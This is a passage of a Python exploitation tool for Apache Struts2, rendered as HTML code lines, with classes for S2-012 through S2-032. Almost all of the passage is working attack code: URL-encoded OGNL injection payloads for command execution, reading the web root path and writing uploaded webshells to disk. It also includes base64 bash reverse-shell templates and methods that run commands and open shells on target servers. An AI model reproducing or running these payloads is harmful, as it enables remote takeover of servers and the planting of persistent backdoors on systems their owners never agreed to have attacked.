&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-012&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_013:</span><br><span class="line">    &quot;&quot;&quot;S2-013/S2-014漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    web_path = &quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D&quot;</span><br><span class="line">    exec_payload = &quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D&quot;</span><br><span class="line">    upload_paylaod = &quot;$%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23fos=%20new%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23outstr.println(%22OK%22),%23outstr.close())%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-013&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.web_path), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.exec_payload.format(cmd=quote(cmd))), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;t=&#123;t&#125;&amp;f=&#123;f&#125;&quot;.format(t=quote(shell), f=upload_path)</span><br><span class="line">        html = post(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.upload_paylaod), data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_015:</span><br><span class="line">    &quot;&quot;&quot;S2-015漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;%24%7B%23context%5B&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())%2C%23q%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&quot;.action&quot;):</span><br><span class="line">            rindex = url.rindex(&#x27;/&#x27;)</span><br><span class="line">            self.url = url[:rindex + 1]</span><br><span class="line">        elif url.endswith(&quot;/&quot;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-015&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + &quot;&#123;payload&#125;.action&quot;.format(payload=payload), self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&#x27;ERROR:&#x27;):</span><br><span class="line">            return html</span><br><span class="line">        try:</span><br><span class="line">            soup = BeautifulSoup(html, &#x27;lxml&#x27;)</span><br><span class="line">            ps = soup.find_all(&#x27;p&#x27;)</span><br><span class="line">            result = unquote(ps[1].text[9:-4]).strip()</span><br><span class="line">            return result</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_016:</span><br><span class="line">    &quot;&quot;&quot;S2-016漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    check_poc = &quot;redirect%3A%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    web_path = &quot;redirect:$%7B%23a%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D&quot;</span><br><span class="line">    exec_payload1 = &quot;redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D&quot;</span><br><span class="line">    exec_payload2 = &quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22&#123;cmd&#125;%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span><br><span class="line">    exec_payload3 = r&quot;redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27ENCODING%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;&quot;</span><br><span class="line">    upload_payload1 = r&quot;&quot;&quot;redirect:$&#123;%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22PATH%22)).append(%23req.getParameter(%22t%22)).close()&#125;&amp;t=SHELL&quot;&quot;&quot;</span><br><span class="line">    upload_payload2 = &quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%22&#123;path&#125;%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22OK%22)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        self.exec_payload = &quot;payload1&quot;</span><br><span class="line">        self.exec_dict = &#123;&quot;payload1&quot;: self.exec_cmd1, &quot;payload2&quot;: self.exec_cmd2, &quot;payload3&quot;: self.exec_cmd3&#125;</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + poc, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            self.select_exec()</span><br><span class="line">            return &#x27;S2-016&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def echo_check(self, exec_fun):</span><br><span class="line">        &quot;&quot;&quot;通过echo输出检查漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        html = exec_fun(&quot;echo &quot; + hash_str)</span><br><span class="line">        if hash_str in html:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def select_exec(self):</span><br><span class="line">        &quot;&quot;&quot;选择合适的执行命令的exp&quot;&quot;&quot;</span><br><span class="line">        result = self.echo_check(self.exec_cmd1)</span><br><span class="line">        if result:</span><br><span class="line">            self.exec_payload = &quot;payload1&quot;</span><br><span class="line">        else:</span><br><span class="line">            result = self.echo_check(self.exec_cmd2)</span><br><span class="line">            if result:</span><br><span class="line">                self.exec_payload = &quot;payload2&quot;</span><br><span class="line">            else:</span><br><span class="line">                result = self.echo_check(self.exec_cmd3)</span><br><span class="line">                if result:</span><br><span class="line">                    self.exec_payload = &quot;payload3&quot;</span><br><span class="line">                else:</span><br><span class="line">                    self.exec_payload = &quot;None&quot;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        if self.exec_payload not in self.exec_dict:</span><br><span class="line">            # print(&quot;[+] 本程序S2_016预设EXP对 &#123;url&#125; 无效!&quot;.format(url=self.url))</span><br><span class="line">            return None</span><br><span class="line">        result = self.exec_dict.get(self.exec_payload)(cmd)</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line">    def exec_cmd1(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload1.format(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd2(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload2.format(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd3(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload3.replace(&#x27;CMD&#x27;, quote(cmd)).replace(&#x27;ENCODING&#x27;, self.encoding),</span><br><span class="line">                   self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell1(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload1.replace(&#x27;PATH&#x27;, quote(upload_path)).replace(&#x27;SHELL&#x27;, quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def upload_shell2(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;t=&quot; + quote(shell)</span><br><span class="line">        web_path = self.get_path()</span><br><span class="line">        upload_path = upload_path.replace(web_path, &#x27;&#x27;)</span><br><span class="line">        html = post(self.url + &#x27;?&#x27; + self.upload_payload2.format(path=upload_path), data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        result = self.upload_shell1(upload_path, shell_path)</span><br><span class="line">        if not result:</span><br><span class="line">            result = self.upload_shell2(upload_path, shell_path)</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_019:</span><br><span class="line">    &quot;&quot;&quot;S2-019漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    web_path = &quot;%23req%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;)%2C%23resp%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23resp.setCharacterEncoding(&#x27;&#123;encoding&#125;&#x27;)%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath(&#x27;%2F&#x27;))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()&quot;</span><br><span class="line">    exec_payload = &quot;%23f%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()&quot;</span><br><span class="line">    upload_payload = r&quot;&quot;&quot;debug=command&amp;expression=%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22&#123;path&#125;%22)).append(%23req.getParameter(%22shell%22)).close()&amp;shell=&#123;shell&#125;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-019&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?debug=command&amp;expression=&#123;payload&#125;&quot;.format(</span><br><span class="line">            payload=self.web_path.format(encoding=self.encoding)), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(</span><br><span class="line">            self.url + &quot;?debug=command&amp;expression=&#123;payload&#125;&quot;.format(payload=self.exec_payload.format(cmd=quote(cmd))),</span><br><span class="line">            self.headers,</span><br><span class="line">            self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload.format(path=quote(upload_path), shell=quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_029:</span><br><span class="line">    &quot;&quot;&quot;S2-029漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;(%23_memberAccess%5B&#x27;allowPrivateAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;excludedPackageNamePatterns&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;excludedClasses&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;allowPackageProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowStaticMethodAccess&#x27;%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;message=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-029&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_032:</span><br><span class="line">    &quot;&quot;&quot;S2-032漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span><br><span class="line">    web_path = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=&#123;encoding&#125;&quot;</span><br><span class="line">    exec_payload = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=&#123;encoding&#125;&amp;cmd=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &quot;1008660253718&quot;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-032&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.web_path.format(encoding=self.encoding), self.headers, 